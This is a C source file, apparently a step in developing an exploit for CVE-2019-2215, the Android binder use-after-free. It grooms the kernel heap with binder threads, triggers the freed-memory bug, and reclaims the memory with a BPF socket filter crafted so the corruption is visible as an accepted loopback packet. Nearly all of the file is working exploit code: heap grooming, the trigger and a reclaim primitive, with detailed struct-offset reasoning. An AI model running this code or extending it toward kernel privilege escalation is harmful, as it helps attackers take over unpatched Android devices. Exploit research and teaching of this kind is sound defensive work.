/*
 * bpf_reclaim_v5.c — CVE-2019-2215 reclaim with CORRECT instruction offset
 *
 * CRITICAL FIX: sk_filter header is 12 bytes (NOT 20!). insns[0] starts at
 * offset 12 in the sk_filter struct. The spinlock in binder_thread is at
 * offset 44. So the spinlock overlaps with insns[4] (offset 12 + 4*8 = 44),
 * NOT insns[3]!
 *
 * Previous tests had the RET instruction at insns[3] (offset 36), which
 * returned BEFORE reaching insns[4]. The corruption at offset 44 was never
 * observed because the BPF filter already exited!
 *
 * Fix: insns[0-3] are all LD_IMM (NOP), insns[4] is the spinlock-compatible
 * RET_K at offset 44.
 *
 * sk_filter layout (header=12, rcu_head overlaps insns):
 *   +0:  refcnt (4)
 *   +4:  len (4)
 *   +8:  bpf_func (4)
 *   +12: insns[0] / rcu_head (8, overlapped)
 *   +20: insns[1]
 *   +28: insns[2]
 *   +36: insns[3]
 *   +44: insns[4] ← SPINLOCK POSITION (binder_thread->wait.lock)
 *   +52: insns[5] ← binder_thread->wait.task_list
 *
 * After UAF:
 *   spin_lock_irqsave on insns[4] → if owner==next, succeeds
 *   list_del writes heap addr to insns[5].code/jt/jf (offset 52) and insns[4].k (offset 48)
 *   spin_unlock increments owner → insns[4].code changes: RET_K(1) → RET_A(2)
 *   Filter returns A (loaded by insns[0-3] = 42) → packet ACCEPTED = detection!
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

#define MAX_GROOM 300

static int do_test(int attempt, int groom_count) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    int det_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    if (det_sock < 0 || sender < 0) return -1;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7F000001);
    addr.sin_port = htons(20000 + (attempt % 10000));
    if (bind(det_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) return -1;
    
    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
    setsockopt(det_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    /* === Binder_thread grooming (kfree, not RCU) === */
    int groom_bfd[MAX_GROOM], groom_epfd[MAX_GROOM];
    int actual_groom = 0;
    for (int i = 0; i < groom_count && i < MAX_GROOM; i++) {
        groom_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (groom_bfd[i] < 0) break;
        uint32_t mx = 0;
        ioctl(groom_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        groom_epfd[i] = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(groom_epfd[i], EPOLL_CTL_ADD, groom_bfd[i], &ev);
        actual_groom = i + 1;
    }
    
    /* Free groom threads (kfree → immediate per-CPU freelist) */
    for (int i = actual_groom - 1; i >= 0; i--) {
        int thr = 0;
        ioctl(groom_bfd[i], BINDER_THREAD_EXIT, &thr);
    }
    for (int i = actual_groom - 1; i >= 0; i--) {
        close(groom_epfd[i]);
    }
    
    /* === Create TARGET binder_thread === */
    int target_bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (target_bfd < 0) goto cleanup_groom;
    uint32_t mx = 0;
    ioctl(target_bfd, BINDER_SET_MAX_THREADS, &mx);
    int target_epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(target_epfd, EPOLL_CTL_ADD, target_bfd, &ev);
    
    /* === Free TARGET thread (kfree → top of LIFO) === */
    int thr = 0;
    ioctl(target_bfd, BINDER_THREAD_EXIT, &thr);
    
    /* === Reclaim with BPF (CORRECTED offset!) ===
     * 
     * KEY FIX: insns[4] is at offset 44 (spinlock position).
     * insns[0-3] must be NOPs (LD_IMM) so filter reaches insns[4].
     * insns[4] = RET_K k=0 with jt=1,jf=0 → spinlock unlocked.
     */
    struct sock_filter det_insns[20];
    memset(det_insns, 0, sizeof(det_insns));
    
    /* insns[0-3] at offsets 12-43: LD_IMM k=42 (A=42, NOPs) */
    for (int j = 0; j < 4; j++) {
        det_insns[j].code = 0x00; /* BPF_LD|BPF_IMM */
        det_insns[j].k = 42;     /* A = 42 */
    }
    
    /* insns[4] at offset 44: RET_K k=0 → DROP
     * Internal code = BPF_S_RET_K = 1 (u16)
     * jt=1, jf=0 → packed u32 = 0x00010001
     * ticket spinlock: owner=1, next=1 → UNLOCKED
     *
     * After spin_lock: next→2, still owner=1
     * After list_del: k field at offset 48 = heap addr (irrelevant for RET_K)
     * After spin_unlock: owner→2, code becomes 0x0002 = BPF_S_RET_A
     * BPF_S_RET_A returns A = 42 → ACCEPT! */
    det_insns[4].code = 0x06; /* BPF_RET|BPF_K */
    det_insns[4].jt = 1;     /* next ticket low byte */
    det_insns[4].jf = 0;     /* next ticket high byte */
    det_insns[4].k = 0;      /* return 0 = DROP */
    
    /* insns[5-18]: RET_K k=0 → DROP (padding, never reached normally) */
    for (int j = 5; j < 19; j++) {
        det_insns[j].code = 0x06;
        det_insns[j].k = 0;
    }
    
    /* insns[19]: RET ACCEPT (safety net) */
    det_insns[19].code = 0x06;
    det_insns[19].k = 0xFFFF;
    
    struct sock_fprog det_prog = { .len = 20, .filter = det_insns };
    if (setsockopt(det_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                   &det_prog, sizeof(det_prog)) < 0) {
        close(target_epfd); close(target_bfd);
        goto cleanup_groom;
    }
    
    /* Verify: packet should be DROPPED before UAF */
    char pre[] = "PRE";
    sendto(sender, pre, sizeof(pre), 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[64];
    ssize_t pre_got = recv(det_sock, buf, sizeof(buf), 0);
    if (pre_got > 0) {
        /* Filter not working as expected */
        close(target_epfd); close(target_bfd);
        close(det_sock); close(sender);
        for (int i = 0; i < actual_groom; i++) close(groom_bfd[i]);
        return -3;
    }
    
    /* === UAF TRIGGER === */
    close(target_epfd);
    
    /* === Detection === */
    char test[] = "UAFTEST!";
    sendto(sender, test, sizeof(test), 0, (struct sockaddr*)&addr, sizeof(addr));
    ssize_t got = recv(det_sock, buf, sizeof(buf), 0);
    
    int result = (got > 0) ? 1 : 0;
    
    close(det_sock); close(sender);
    close(target_bfd);
    for (int i = 0; i < actual_groom; i++) close(groom_bfd[i]);
    return result;

cleanup_groom:
    close(det_sock); close(sender);
    for (int i = 0; i < actual_groom; i++) close(groom_bfd[i]);
    return -1;
}

int main() {
    printf("=== CVE-2019-2215 BPF Reclaim v5 (CORRECT insns[4] offset) ===\n");
    printf("sk_filter header=12: insns[4] at offset 44 = spinlock position\n");
    printf("insns[0-3]=LD_IMM(A=42), insns[4]=RET_K(k=0,jt=1,jf=0)\n");
    printf("After UAF: code RET_K→RET_A, returns A=42 → ACCEPT\n\n");
    
    struct { int groom; int attempts; char *label; } tests[] = {
        {0,   500, "No groom"},
        {50,  500, "50 binder groom"},
        {100, 500, "100 binder groom"},
        {200, 300, "200 binder groom"},
    };
    
    for (int t = 0; t < 4; t++) {
        printf("--- %s, %d attempts ---\n", tests[t].label, tests[t].attempts);
        
        int detected = 0, errors = 0, filter_bad = 0, hangs = 0;
        for (int i = 0; i < tests[t].attempts; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(4);
                int r = do_test(i, tests[t].groom);
                _exit(r < 0 ? 200 + (-r) : r);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
                int code = WEXITSTATUS(status);
                if (code == 1) {
                    detected++;
                    if (detected <= 5)
                        printf("  [%d] *** UAF DETECTED! Packet accepted after corruption! ***\n", i);
                } else if (code == 203) filter_bad++;
                else if (code >= 200) errors++;
            } else if (WIFSIGNALED(status)) {
                int sig = WTERMSIG(status);
                if (sig == 14) {
                    hangs++;
                    if (hangs <= 3) printf("  [%d] HANG (spinlock stuck → possible header=20)\n", i);
                } else errors++;
            }
            
            if ((i+1) % 100 == 0)
                printf("  [%d/%d] detected=%d hangs=%d errors=%d bad=%d\n",
                       i+1, tests[t].attempts, detected, hangs, errors, filter_bad);
        }
        printf("  TOTAL: %d/%d detected, %d hangs, %d errors, %d filter_bad\n\n",
               detected, tests[t].attempts, hangs, errors, filter_bad);
        
        if (detected > 0) {
            printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf("!!! CVE-2019-2215 UAF CONFIRMED EXPLOITABLE !!!\n");
            printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            break;
        }
    }
    
    printf("\n=== Done ===\n");
    return 0;
}
